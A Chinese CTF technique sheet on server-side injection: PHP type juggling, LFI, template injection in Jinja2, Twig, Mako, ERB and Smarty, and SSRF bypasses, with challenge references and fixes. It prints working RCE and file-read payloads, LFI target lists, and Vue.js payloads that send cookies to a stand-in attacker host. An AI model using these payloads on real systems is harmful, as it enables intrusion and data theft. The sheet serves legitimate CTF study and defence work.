# CTF Web - 服务端注入攻击

## 目录
- [PHP 类型混淆](#php-类型混淆)
- [PHP 文件包含 / php://filter](#php-文件包含--phpfilter)
- [SQL 注入](#sql-注入) — 已迁移到 [sql-injection.md](sql-injection.md)
- [Python str.format() 属性遍历（PlaidCTF 2017）](#python-strformat-属性遍历plaidctf-2017)
- [SSTI（服务端模板注入）](#ssti服务端模板注入)
  - [Jinja2 RCE](#jinja2-rce)
  - [Go 模板注入](#go-模板注入)
  - [EJS 服务端模板注入](#ejs-服务端模板注入)
  - [ERB SSTI + Sequel::DATABASES 绕过（BearCatCTF 2026）](#erb-ssti--sequeldatabases-绕过bearcatctf-2026)
  - [Mako SSTI](#mako-ssti)
  - [Twig SSTI](#twig-ssti)
  - [通过 toString.constructor 的 Vue.js 模板注入（VolgaCTF 2018）](#通过-tostringconstructor-的-vuejs-模板注入volgactf-2018)
  - [通过 `__dict__.update()` 绕过 SSTI 引号过滤（ApoorvCTF 2026）](#通过-__dict__update-绕过-ssti-引号过滤apoorvctf-2026)
- [SSRF](#ssrf)
  - [Host 头 SSRF（MireaCTF）](#host-头-ssrfmireactf)
  - [DNS Rebinding 打 TOCTOU（检查时到使用时）](#dns-rebinding-打-toctou检查时到使用时)
  - [Curl 重定向链绕过](#curl-重定向链绕过)
  - [未转义点号正则白名单绕过（Meepwn CTF Quals 2018）](#未转义点号正则白名单绕过meepwn-ctf-quals-2018)
  - [通过 HTTPS 的 SNI FTP 协议走私（PlaidCTF 2018）](#通过-https-的-sni-ftp-协议走私plaidctf-2018)
  - [通过 Host 头覆盖 Apache mod_vhost_alias 文档根（RCTF 2018）](#通过-host-头覆盖-apache-mod_vhost_alias-文档根rctf-2018)
- [PHP hash_hmac 对数组输入返回 NULL（AceBear 2018）](#php-hash_hmac-对数组输入返回-nullacebear-2018)
- [通过 CVE-2017-1000480 注释注入的 Smarty SSTI（Insomni'hack 2018）](#通过-cve-2017-1000480-注释注入的-smarty-sstiinsomnihack-2018)
- [递归替换路径穿越 `....//`（35C3 2018）](#递归替换路径穿越-35c3-2018)
- [PHP (int) 转换只取前导数字的穿越（35C3 2018）](#php-int-转换只取前导数字的穿越35c3-2018)
- [strpos 子串匹配黑名单绕过（TUCTF 2018）](#strpos-子串匹配黑名单绕过tuctf-2018)
- [按 User-Agent 分流的 robots.txt（TAMUctf 2019）](#按-user-agent-分流的-robotstxttamuctf-2019)
- [PHP log()/INF 数学相等 + 递归 urldecode()（Pragyan CTF 2019）](#php-loginf-数学相等--递归-urldecodepragyan-ctf-2019)

XXE、XML 注入、PHP 可变变量滥用、uniqid/正则绕过、命令注入和 GraphQL 利用见 [server-side-2.md](server-side-2.md)。代码执行攻击（Ruby/Perl/JS/LaTeX/Prolog 注入、PHP preg_replace /e、ReDoS、文件上传转 RCE、PHP 反序列化、XPath 注入、Thymeleaf SpEL SSTI）见 [server-side-exec.md](server-side-exec.md)。SQLi 关键字分片、SQL WHERE 绕过、通过 DNS 的 SQL、bash 花括号展开、Common Lisp 注入、PHP7 OPcache 等见 [server-side-exec-2.md](server-side-exec-2.md)。反序列化攻击（Java、Pickle）和竞态条件见 [server-side-deser.md](server-side-deser.md)。CVE 专项利用、路径穿越绕过、Flask/Werkzeug 调试及其他进阶技术见 [server-side-advanced.md](server-side-advanced.md)。

---

<a id="php-type-juggling"></a>
## PHP 类型混淆

**模式：** PHP 的松散比较（`==`）会做隐式类型转换，产生意外的相等结果，从而绕过认证和校验。

**比较表（使用 `==` 时全部为 `true`）：**
| 比较 | 结果 | 原因 |
|-----------|--------|-----|
| `0 == "php"` | `true` | 非数字字符串转换为 `0` |
| `0 == ""` | `true` | 空字符串转换为 `0` |
| `"0" == false` | `true` | `"0"` 为假值 |
| `NULL == false` | `true` | 两者都为假值 |
| `NULL == ""` | `true` | 两者都为假值 |
| `NULL == array()` | `true` | 两者都为空 |
| `"0e123" == "0e456"` | `true` | 两者都按科学计数法解析为 `0` |

**用类型混淆绕过认证：**
```php
// 有漏洞：if ($input == $password)
// 如果 $password 以 "0e" 开头后跟数字（MD5 "魔法哈希"）：
// md5("240610708") = "0e462097431906509019562988736854"
// md5("QNKCDZO")  = "0e830400451993494058024219903391"
// 两者比较为 0 == 0 → true
```

**通过 JSON 类型混淆利用：**
```bash
# 发送整数 0 而不是字符串，绕过 strcmp/==
curl -X POST http://target/login \
  -H 'Content-Type: application/json' \
  -d '{"password": 0}'
# PHP: 0 == "any_non_numeric_string" → true
```

**用数组绕过 strcmp：**
```bash
# strcmp(array, string) 返回 NULL，而 NULL == 0 == false
curl http://target/login -d 'password[]=anything'
# PHP: strcmp(["anything"], "secret") → NULL → if(!strcmp(...)) 通过
```

**防护：** 使用严格比较（`===`），同时检查值和类型。

**关键点：** 对 PHP 比较端点始终测试 `0`、`""`、`NULL`、`[]` 和 `"0e..."` 魔法哈希。JSON `Content-Type` 允许在应用期望字符串的位置发送整数 `0`。

---

<a id="php-file-inclusion--phpfilter"></a>
## PHP 文件包含 / php://filter

**模式：** PHP 的 `include`、`require`、`require_once` 接受动态路径。配合 `php://filter` 可以在不执行的情况下泄露源码。

**基础 LFI：**
```php
// 有漏洞：include($_GET['page'] . ".php");
// 利用：page=../../../../etc/passwd%00  （空字节，PHP < 5.3.4）
// 现代：page=php://filter/convert.base64-encode/resource=index
```

**通过 php://filter 泄露源码：**
```bash
# Base64 编码阻止 PHP 执行，泄露原始源码
curl "http://target/?page=php://filter/convert.base64-encode/resource=config"
# 返回：PD9waHAgJHBhc3N3b3JkID0gInMzY3IzdCI7IC...
echo "PD9waHAg..." | base64 -d
# 输出：<?php $password = "s3cr3t"; ...
```

**用于 RCE 的过滤器链（PHP >= 7）：**
```bash
# 串联 convert 过滤器写入任意内容
php://filter/convert.iconv.UTF-8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
```

**常见 LFI 目标：**
```text
/etc/passwd                          # 用户枚举
/proc/self/environ                   # 环境变量（密钥）
/proc/self/cmdline                   # 进程命令行
/var/log/apache2/access.log          # 日志投毒点
/var/www/html/config.php             # 应用密钥
php://filter/convert.base64-encode/resource=index  # 源码
```

**关键点：** `php://filter/convert.base64-encode/resource=` 是通过 LFI 读 PHP 源码最可靠的方式——base64 编码阻止被包含文件作为 PHP 执行。

---

<a id="sql-injection"></a>
## SQL 注入

SQL 注入技术已迁移到独立文件。所有 SQL 注入技术见 [sql-injection.md](sql-injection.md)。

---

<a id="python-strformat-attribute-traversal-plaidctf-2017"></a>
## Python str.format() 属性遍历（PlaidCTF 2017）

**模式：** Python 的 `str.format()` 允许对格式参数做属性/索引遍历。用户输入进入 `.format(obj)` 时，攻击者可以访问传入对象的任意属性。

```python
# 通过格式化字符串泄露对象属性
payload = "{0.__class__.__mro__}"
payload = "{0.secret_field}"

# Flask 中：端点使用 new_name.format(player_object)
# 发送：{0.pykemon} 泄露所有 pykemon 对象

# 访问嵌套属性
"{0.__class__.__init__.__globals__}"

# 用方括号访问字典键
"{0[secret_key]}"

# 串联属性和索引访问
"{0.__class__.__mro__[1].__subclasses__()}"
```

**常见易受害写法：**
```python
# 有漏洞：用户输入作为格式字符串
greeting = user_input.format(current_user)

# 有漏洞：用 request 对象格式化
message = template_str.format(request)

# 安全替代：只用位置参数或关键字参数
greeting = "Hello, {name}!".format(name=user_input)
```

**关键点：** 与 `%s` 格式化不同，Python `str.format()` 允许点号属性遍历（`{0.attr.subattr}`）和方括号索引（`{0[key]}`），任何格式字符串受用户控制的 `.format()` 调用都会变成信息泄露。这与 SSTI 不同——不需要模板引擎，只需要用户可控的格式字符串。注意 Flask/Django 视图里对模型对象或 request 对象使用 `.format()` 且格式串来自用户的地方。

---

<a id="ssti-server-side-template-injection"></a>
## SSTI（服务端模板注入）

<a id="jinja2-rce"></a>
### Jinja2 RCE
```python
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}

# 不用引号（用 bytes）：
{{self.__init__.__globals__.__builtins__.__import__(
    self.__init__.__globals__.__builtins__.bytes([0x6f,0x73]).decode()
).popen('cat /flag').read()}}

# Flask/Werkzeug：
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

<a id="go-template-injection"></a>
### Go 模板注入
```go
{{.ReadFile "/flag.txt"}}
```
**注意：** `{{.ReadFile ...}}` 只有在应用的 `template.FuncMap` 暴露了 `ReadFile` 函数时才有效（如 `template.New("x").Funcs(template.FuncMap{"ReadFile": os.ReadFile})`）——Go 的 `text/template` 没有内置文件读取，因此这个 payload 证明存在自定义 `FuncMap` 项，而不是默认模板行为。

<a id="ejs-server-side-template-injection"></a>
### EJS 服务端模板注入
**模式（Checking It Twice）：** 错误路径中把用户输入传给 `ejs.render()`。
```javascript
<%- global.process.mainModule.require('./db.js').queryDb('SELECT * FROM table').map(row=>row.col1+row.col2).join(" ") %>
```

<a id="erb-ssti--sequeldatabases-bypass-bearcatctf-2026"></a>
### ERB SSTI + Sequel::DATABASES 绕过（BearCatCTF 2026）

**模式（Treasure Hunt 5）：** Sinatra（Ruby）应用使用 ERB 模板。ERBSandbox 限制了直接数据库访问，但 `Sequel::DATABASES` 这个全局列表没有限制。

**检测：** Ruby/Sinatra 应用，源码中 `require 'erb'`。Cookie 或参数被反射进渲染响应。

```bash
# 确认 SSTI
curl --cookie 'name=<%= 7*7 %>' http://target/upload-highscore
# 响应包含 "49"

# 枚举表
curl --cookie 'name=<%= Sequel::DATABASES.first.tables %>' ...
# → [:players]

# 转储 schema
curl --cookie 'name=<%= Sequel::DATABASES.first.schema(:players) %>' ...

# 外带数据
curl --cookie 'name=<%= Sequel::DATABASES.first[:players].all %>' ...
```

**关键点：** 即使 ERB 沙箱屏蔽了 `DB` 或 `DATABASE` 常量，`Sequel::DATABASES` 仍是列出所有已打开 Sequel 连接的全局数组，能绕过基于变量名的限制。在 Sinatra 中，cookie 或参数里的 `<%= ... %>` 被 ERB 模板反射是常见的 SSTI 入口。

<a id="mako-ssti"></a>
### Mako SSTI

```python
# 检测
${7*7}  # 返回 49

# RCE
<%
  import os
  os.popen("id").read()
%>

# 一行版
${__import__('os').popen('cat /flag.txt').read()}
```

**关键点：** Mako 模板（Python）直接在 `${}` 或 `<% %>` 块中执行 Python 代码——没有沙箱，也不需要类遍历。检测方式与 Jinja2 相同（`${7*7}`），但 payload 就是普通 Python。

<a id="twig-ssti"></a>
### Twig SSTI

```twig
{# 检测 #}
{{7*7}}   {# 返回 49 #}
{{7*'7'}} {# 返回 7777777（字符串重复 = Twig，不是 Jinja2） #}

{# 文件读取 #}
{{'/etc/passwd'|file_excerpt(1,30)}}

{# RCE（Twig 1.x） #}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{# RCE（Twig 3.x 通过过滤器） #}
{{['id']|map('system')|join}}
{{['cat /flag.txt']|map('passthru')|join}}
```

**关键点：** 用 `{{7*'7'}}` 区分 Twig 和 Jinja2——Twig 重复字符串（`7777777`），Jinja2 返回 `49`。Twig 3.x 移除了 `_self.env` 访问；改用 `|map('system')` 过滤器链。

<a id="vuejs-template-injection-via-tostringconstructor-volgactf-2018"></a>
### 通过 toString.constructor 的 Vue.js 模板注入（VolgaCTF 2018）

**模式：** 利用构造函数链执行 JavaScript 的 Vue.js 客户端模板注入。当用户输入被渲染进 Vue.js 模板（通过 `v-html`、服务端插值到 Vue 模板，或反射进 `{{ }}` 定界符）时，模板表达式求值器会执行 JavaScript。

**基础 payload：**
```javascript
// 构造函数链创建并执行 Function 对象
${toString.constructor('document.location="http://attacker/?"+document.cookie')()}

// 另一种构造函数链
{{constructor.constructor('return fetch("http://attacker/?c="+document.cookie)')()}}

// 用内部 _c（createElement）确认 Vue 上下文
{{_c.constructor('return 1')()}}
```

**针对不同 Vue 版本的 payload 变体：**
```javascript
// Vue 2.x —— 模板表达式可以访问组件作用域
{{constructor.constructor('return this')().document.location='http://attacker/?c='+document.cookie}}

// Vue 2.x —— 通过 toString
${toString.constructor('alert(document.domain)')()}

// Vue 3.x —— 沙箱更严格，但构造函数链仍然有效
{{(_=toString.constructor('return document'))().cookie}}
```

**检测与利用：**
```python
import requests

target = "http://target/page"

# 第 1 步：检测 Vue.js 模板注入
probes = [
    "{{7*7}}",           # 表达式被求值时返回 49
    "{{toString()}}",    # 返回 [object Object] 之类
    "${7*7}",            # 模板字面量语法（部分 Vue 配置）
]
for probe in probes:
    r = requests.get(target, params={"name": probe})
    print(f"Probe: {probe} -> {r.text[:200]}")

# 第 2 步：通过构造函数链执行
payload = "${toString.constructor('document.location=\"http://attacker/?c=\"+document.cookie')()}"
r = requests.get(target, params={"name": payload})
```

**关键点：** Vue.js 模板表达式会执行 JavaScript。用户输入被渲染进 Vue 模板时，`toString.constructor(code)()` 会创建并执行 Function 对象，绕过简单的关键字过滤。原理是 JavaScript 任何对象上的 `constructor` 属性都能访问 `Function` 构造函数。Vue 2.x 更宽松；Vue 3.x 表达式沙箱更严格，但构造函数链通常仍有效。注意包含 Vue.js 且使用 `{{ }}` 或 `v-bind` 指令的页面中的反射输入。

<a id="ssti-quote-filter-bypass-via-__dict__update-apoorvctf-2026"></a>
### 通过 `__dict__.update()` 绕过 SSTI 引号过滤（ApoorvCTF 2026）

**模式（KameHame-Hack）：** Jinja2 SSTI 过滤了引号，无法传字符串参数。用 Python 关键字参数绕过——`__dict__.update(key=value)` 不需要引号。

```python
# 引号被过滤 → 不能写 {{ config['SECRET_KEY'] }} 或字符串参数
# 但关键字参数不需要引号：
{{player.__dict__.update(power_level=9999999) or player.name}}
```

**原理：**
1. `player.__dict__.update(power_level=9999999)` —— 通过关键字参数直接修改对象属性（不需要引号）
2. `or player.name` —— `dict.update()` 返回 `None`（假值），Jinja2 于是渲染 `player.name`
3. 属性修改在会话的后续请求中持续存在

**关键点：** SSTI 过滤拦截引号/字符串时，Python 的关键字参数语法（`func(key=value)`）完全不需要字符串定界符。`__dict__.update()` 可以修改任意对象属性，绕过应用逻辑（如游戏状态、认证检查、权限等级）。

<a id="smarty-ssti-via-cve-2017-1000480-comment-injection-insomnihack-2018"></a>
### 通过 CVE-2017-1000480 注释注入的 Smarty SSTI（Insomni'hack 2018）

**模式：** Smarty 3 < 3.1.32 在自定义模板资源下，会把模板源文件路径放进编译模板的 PHP 注释（`/* ... */`）中。如果路径用户可控且 `*/` 未清洗，注入 `*/phpcode();/*` 就能闭合注释并执行任意 PHP。

```text
# 有漏洞的 URL 模式——模板 ID/路径用户可控：
http://target/?id=*/echo file_get_contents('/flag');/*

# 服务端编译模板中的样子：
# <?php /* source: /path/to/*/echo file_get_contents('/flag');/* */ ?>
# 注入的 */ 闭合注释，PHP 代码执行，/* 重新打开注释
```

```php
// Smarty 编译模板（简化）：
// 注入前：
<?php /* Smarty version x, compiled from "user_template_name" */ ?>

// 用 id = */echo file_get_contents('/flag');/* 注入后
<?php /* Smarty version x, compiled from "*/echo file_get_contents('/flag');/*" */ ?>
// 拆解为：
//   /* Smarty version x, compiled from "*/   ← 注释在此结束
//   echo file_get_contents('/flag');          ← PHP 执行
//   /*" */                                    ← 新注释
```

```python
import requests

# 基础文件读取
r = requests.get("http://target/", params={
    "id": "*/echo file_get_contents('/flag');/*"
})
print(r.text)

# RCE
r = requests.get("http://target/", params={
    "id": "*/system('id');/*"
})
print(r.text)

# 如果括号被过滤，用反引号执行：
r = requests.get("http://target/", params={
    "id": "*/echo `cat /flag`;/*"
})
```

**关键点：** Smarty 把模板源路径放进 `/* ... */` PHP 注释。路径用户可控且 `*/` 未清洗时，任意 PHP 都会执行。影响自定义 Smarty 资源（模板名来自用户输入），不影响默认基于文件的资源处理器。Smarty 3.1.32 已修复。注意模板标识符来自 URL 参数的 Smarty 渲染逻辑。

---

<a id="php-hash_hmac-returns-null-with-array-input-acebear-2018"></a>
## PHP hash_hmac 对数组输入返回 NULL（AceBear 2018）

**模式：** 当 `$data` 参数是数组而不是字符串时，PHP 的 `hash_hmac()` 返回 `NULL`（产生警告而非致命错误）。通过 POST 发送 `nonce[]=x` 强制参数为数组，使 HMAC 输出可预测，因为 `hash_hmac('sha256', NULL, $secret)` 等价于 `hash_hmac('sha256', '', $secret)`——更关键的是，当 `$key` 参数从之前失败的 `hash_hmac` 收到 `NULL` 时，后续所有 HMAC 计算都使用空密钥。

```php
// 有漏洞的服务端代码：
$nonce = $_POST['nonce'];
$secret = file_get_contents('/secret_key');
$mac = hash_hmac('sha256', $nonce, $secret);  // $nonce 是数组时返回 NULL

// 之后：服务端把 $mac（NULL）当作另一个 HMAC 的密钥
$token = hash_hmac('sha256', 'gimmeflag', $mac);
// hash_hmac('sha256', 'gimmeflag', NULL) == hash_hmac('sha256', 'gimmeflag', '')
// 这是攻击者可以预先计算的已知常量！
```

```python
import hmac
import hashlib
import requests

# 预先计算 mac=NULL 时服务端会生成的 token
# PHP 的 hash_hmac('sha256', 'gimmeflag', NULL) == Python 的空密钥 HMAC
known_token = hmac.new(b'', b'gimmeflag', hashlib.sha256).hexdigest()
print(f"Predicted token: {known_token}")

# 强制 nonce 为数组，破坏 hash_hmac
r = requests.post("http://target/getflag", data={
    "nonce[]": "x",          # PHP 收到 $_POST['nonce'] 为数组 ['x']
    "token": known_token      # 服务端比较通过
})
print(r.text)
```

```text
# 展示数组注入的 HTTP 请求：
POST /getflag HTTP/1.1
Content-Type: application/x-www-form-urlencoded

nonce[]=x&token=<precomputed_hmac>
```

**关键点：** PHP 会静默转换类型，`hash_hmac` 的 `$data` 参数不是字符串时返回 `NULL`/`false` 而不报错。始终检查参数能否通过 `param[]=value` 强制为数组。这个模式也适用于其他 PHP 哈希函数：`md5(array())` 返回 `NULL`，`sha1(array())` 返回 `NULL`。任何把哈希输出作为后续操作密钥的认证流程，只要中间哈希能被强制为 `NULL`，就存在漏洞。

---

<a id="ssrf"></a>
## SSRF

<a id="host-header-ssrf-mireactf"></a>
### Host 头 SSRF（MireaCTF）

服务端代码使用 HTTP `Host` 头构造内部校验请求：
```go
// 有漏洞：使用客户端可控的 Host 头做内部请求
response, err := http.Get("http://" + c.Request.Host + "/validate")
```

**利用：**
1. 搭建攻击者控制的服务器，返回期望响应：
   ```python
   from flask import Flask
   app = Flask(__name__)

   @app.route("/validate")
   def validate():
       return '{"access": true}'

   app.run(host='0.0.0.0', port=5000)
   ```
2. 通过 ngrok 或公网 VPS 暴露，然后用伪造的 Host 头发请求：
   ```bash
   curl -H "Host: attacker.ngrok-free.app" https://target/api/secret-object
   ```

**关键点：** 服务端向 `http://<Host头>/validate` 而不是 `http://localhost/validate` 发内部请求。把 Host 头设为攻击者域名后，校验请求会打到攻击者服务器，由它返回 `{"access": true}`，彻底绕过基于 IP 的访问控制。

**检测：** 服务端代码用 `request.Host`、`request.headers['Host']`、`c.Request.Host`（Go/Gin）或 `$_SERVER['HTTP_HOST']`（PHP）构造内部服务 URL。

---

<a id="dns-rebinding-for-toctou-time-of-check-to-time-of-use"></a>
### DNS Rebinding 打 TOCTOU（检查时到使用时）
```python
rebind_url = "http://7f000001.external_ip.rbndr.us:5001/flag"
requests.post(f"{TARGET}/register", json={"url": rebind_url})
requests.post(f"{TARGET}/trigger", json={"webhook_id": webhook_id})
```

<a id="curl-redirect-chain-bypass"></a>
### Curl 重定向链绕过
超过 `CURLOPT_MAXREDIRS` 后，某些实现会再发一次未校验的请求：
```c
case CURLE_TOO_MANY_REDIRECTS:
    curl_easy_getinfo(curl, CURLINFO_REDIRECT_URL, &redirect_url);
    curl_easy_setopt(curl, CURLOPT_URL, redirect_url);  // 没有校验
    curl_easy_perform(curl);
```

<a id="unescaped-dot-regex-allowlist-bypass-meepwn-ctf-quals-2018"></a>
### 未转义点号正则白名单绕过（Meepwn CTF Quals 2018）

**模式：** SSRF 目标白名单用类似 `/^https?:\/\/meepwntube\.0x1337\.space$/` 的正则实现。作者忘了转义点号，`.` 于是匹配任意字符。注册一个字面名称包含正确字符的域名（`meepwntubex0x1337.space`），把 A 记录指向 `127.0.0.1`。

**利用：**
```bash
# 注册 meepwntubex0x1337.space，A 记录 → 127.0.0.1
curl "https://target/fetch?url=http://meepwntubex0x1337.space/internal"
# 正则：/meepwntube.0x1337.space$/ 匹配（每个 '.' 都匹配 '.' 或 'x'）
# DNS 解析到 127.0.0.1 → SSRF 打内部服务
```

**关键点：** URL 白名单正则中的 `.` 必须转义（`\.`），并且两端都要锚定（`^...$`）。未转义的点号会把白名单变成通配前缀/后缀匹配——任何符合骨架的攻击者域名都能通过。再配合指向回环/内网段的 DNS 记录即可直接 SSRF。

**参考：** Meepwn CTF Quals 2018 — writeup 10441

<a id="sni-based-ftp-protocol-smuggling-via-https-plaidctf-2018"></a>
### 通过 HTTPS 的 SNI FTP 协议走私（PlaidCTF 2018）

**模式（idIoT: Camera）：** 自定义 FTP 服务器暴露了一个供被动模式握手使用的 `IP` 命令。攻击者唯一原语是浏览器 fetch（XSS）。浏览器拒绝发送自定义 FTP 命令，但会建立 HTTPS 连接——TLS ClientHello 中的 Server Name Indication（SNI）是明文。FTP 服务器忽略未知命令，并把 `\n` 和 `\x00` 都当作命令终止符，因此精心构造的主机名会把 FTP 命令泄露进解析器。

**利用：**
```text
# 受害者 SNI 主机名编码 FTP 命令。SNI 长度字段
#（2 字节：0x00 0x69）在首字节与 ASCII 'i' 对齐时变成 'i\n'。
# 后续 payload 字节携带 'IP 240.1.2.3\n' 终止符。

https://ip8.8.8.8.aaaaaa...aaa.127.0.0.1.xip.io:1212/
```
1. 主机 `ip8.8.8.8....xip.io` 解析到 FTP 服务器端口。
2. 浏览器发送 TLS ClientHello，其 SNI 字节中嵌入 `IP 240.1.2.3\n`。
3. FTP 服务器的行解析器把 SNI 字节当成新的 `IP` 命令，将被动模式目标改到攻击者。
4. 后续 `PASV` 响应把受害者客户端指向攻击者 IP，泄露上传的图片。

**关键点：** 加密协议中任何明文帧（SNI、HTTP Host 头、ALPN）都是解析原始字节的服务器的走私面。当受害者浏览器拒绝直接说目标协议时，选择握手会回显攻击者可控字节的协议，并调整主机名让这些字节恰好构成目标解析器中的合法命令。

**参考：** PlaidCTF 2018 — writeup 10018

<a id="apache-mod_vhost_alias-docroot-override-via-host-header-rctf-2018"></a>
### 通过 Host 头覆盖 Apache mod_vhost_alias 文档根（RCTF 2018）

**模式：** 服务器使用 Apache `mod_vhost_alias` 加通配文档根，如 `VirtualDocumentRoot /var/www/%0/`，服务目录在请求时由 `Host` 头推导。PHP 沙箱把执行限制在 `/var/www/sandbox/<token>/`，但文档根本身来自请求头，设置 `Host: ../../var/www/`（或任意相邻 vhost）会在 PHP 查看 `open_basedir` 之前就把运行目录指到沙箱外。

**利用：**
```http
GET /shell.php HTTP/1.1
Host: ../admin
```
Apache 把文档根解析为 `/var/www/admin`，请求落在一个本不打算提供攻击者代码的目录，完全绕过沙箱。

**关键点：** 多租户 Apache 配置从用户可控输入（`Host`、`X-Forwarded-Host`、cookie）计算文档根时，下游所有基于目录的隔离机制（PHP `open_basedir`、chroot 辅助）都依赖“文档根解析前输入已被清洗”。要么用 `ServerName`/`ServerAlias` 固定文档根，要么在 Apache 层拒绝包含 `..`、`/` 或 NUL 的 Host 值。

**参考：** RCTF 2018 — writeup 10150

<a id="recursive-replace-traversal--35c3-2018"></a>
## 递归替换路径穿越 `....//`（35C3 2018）

**模式：** 过滤器用一次 `str_replace('../', '', $path)` 删除 `../`。payload `....//` 中间恰好包含一次 `../`——删除后，两侧字符塌缩成 `../`。

```text
Accept-Language: ....//....//....//....//flag
            →    ../ ../ ../ ../flag
```

**关键点：** 只删除一次子串的非递归过滤器，其残留会交错重组出目标串。`....//` 针对 `../`；`....\\\\` 针对 `..\`。一直用到过滤器迭代到不动点为止。

**参考：** 35C3 CTF 2018 — flags，writeup 12831

---

<a id="php-int-cast-leading-number-traversal-35c3-2018"></a>
## PHP (int) 转换只取前导数字的穿越（35C3 2018）

**模式：** 校验把参数转成 `(int)` 再与黑名单比较，但原始字符串之后被拼进文件系统路径。`(int) "-4133353959107185265/../../admin"` 返回 `-4133353959107185265`，数字检查通过，而原始值携带路径穿越。

```text
id=-4133353959107185265/../../admin
```

**关键点：** 任何“转换”而不是“解析”的校验器都只能看到前导数字。同一字符串在下游被复用时，务必用严格正则（`^-?\d+$`）比较原始输入。

**参考：** 35C3 CTF 2018 — Not(e) accessible，writeup 12879

---

<a id="strpos-substring-match-blacklist-bypass-tuctf-2018"></a>
## strpos 子串匹配黑名单绕过（TUCTF 2018）

**模式：** PHP 用 `if (strpos($file, '/etc/passwd') == true) die();` 拦截 LFI 目标。`strpos` 返回子串的**位置**（或 `false`），所以过滤器只拦截包含该字面量的路径。任何指向其他文件的穿越都能通过。

```php
# 绕过：file=../../TheEgg.html —— strpos 返回 false，include 继续
```

另外：`strpos(...) == true`（松散比较）对任何非零偏移都为真；这个 bug 的隐蔽版本会拦截偏移 `>=1` 的子串匹配，却放行偏移 `0` 的匹配。

**关键点：** `strpos()`、`str_contains()`、`preg_match()` 是识别检查，不是校验。文件名/路径安全应使用 `realpath()` 解析完整路径，再与白名单根目录比较。

**参考：** TUCTF 2018 — Easter Egg: Crystal Gate，writeup 12380

---

<a id="user-agent-gated-robotstxt-tamuctf-2019"></a>
## 按 User-Agent 分流的 robots.txt（TAMUctf 2019）

**模式：** `/robots.txt` 根据 `User-Agent` 返回不同内容。人类（默认 UA）看到诱饵文件；`Googlebot/2.1` 等爬虫 UA 看到真实的 `Disallow:` 列表——挑战把路径藏在里面。

```bash
# 诱饵
curl -s http://target/robots.txt
# "WHAT IS UP, MY FELLOW HUMAN! ..."

# 真实文件
curl -s -A 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)' \
     http://target/robots.txt
# User-agent: Googlebot
# Disallow: /super-secret-admin-panel/
# Disallow: /flag-is-here.txt
```

侦察发现主题化 robots.txt 诱饵时，轮换常见爬虫 UA：

```bash
for UA in \
  'Googlebot/2.1' \
  'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)' \
  'Mozilla/5.0 (compatible; YandexBot/3.0)' \
  'facebookexternalhit/1.1' \
  'Slackbot-LinkExpanding 1.0' \
  'Twitterbot/1.0'; do
  echo "=== $UA ==="
  curl -s -A "$UA" http://target/robots.txt
done
```

**关键点：** `robots.txt`（以及 `sitemap.xml`、`/.well-known/*`、首页）上的机器人专属内容协商可能泄露对人类浏览器隐藏的路径。始终用 `User-Agent: Googlebot/2.1` 和其他主要爬虫签名测试——同样的绕过也适用于允许机器人索引内容的付费墙，以及仅按 UA 放行爬虫的 WAF。

**参考：** TAMUctf 2019 — Robots Rule，writeup 13707

---

<a id="php-loginf-math-equality--recursive-urldecode-pragyan-ctf-2019"></a>
## PHP log()/INF 数学相等 + 递归 urldecode()（Pragyan CTF 2019）

**模式 1 —— INF == INF：** PHP 对巨大浮点数调用 `log()`/`log10()` 返回 `INF`，而 `INF == INF` 为真。类似
```php
$a = hash('sha256', $a);              // 64 个十六进制字符，如 "a..." -> 字符串
$a = (log10($a ** 0.5)) ** 2;         // "a..." ** 0.5 -> INF，log10(INF) -> INF，**2 -> INF
if ($c > 0 && $d > 0 && $d > $c && $a == $c*$c + $d*$d) { /* 通过 */ }
```
的门槛，只要 `$c*$c + $d*$d` 也是 INF 就能通过。`7e1000`（超过 `DBL_MAX`）在 PHP 中是 `INF`，因此 `val3=1&val4=7E1000` 在两边都是 INF 的同时满足 `$d > $c`。

**模式 2 —— 递归 urldecode 循环：** 循环要求 `$b != urldecode($b)` 成立十次，且最终值等于 `"WoAHh!"`。`%25` 解码为 `%`，每轮剥一层：把第一个字符编码九次。
```
WoAHh! -> %57oAHh! -> %2557oAHh! -> ...（10 层）-> %2525252525252525252557oAHh!
```

```bash
curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000&val5=a&val6=%2525252525252525252557oAHh!'
```

**关键点：** PHP 浮点比较接受 `INF == INF`；只要能把两边都推过 `DBL_MAX`，任何数学式相等检查都会变得平凡。哈希转成浮点后会塌缩成 0 或 INF，所以 `sha256(x) ** 0.5` 和 `log*()` 是经典的“混淆”原语。对递归解码循环，重复 urldecode 的不动点是“没有 `%` 剩余”；用 `%25` 给一个字符编码 N 次，强制恰好 N 轮。

**参考：** Pragyan CTF 2019 — Mandatory PHP，writeup 13837

---

XXE、XML 注入、命令注入、GraphQL 以及其余 PHP 专属技巧（可变变量、uniqid、连续正则绕过）见 [server-side-2.md](server-side-2.md)。
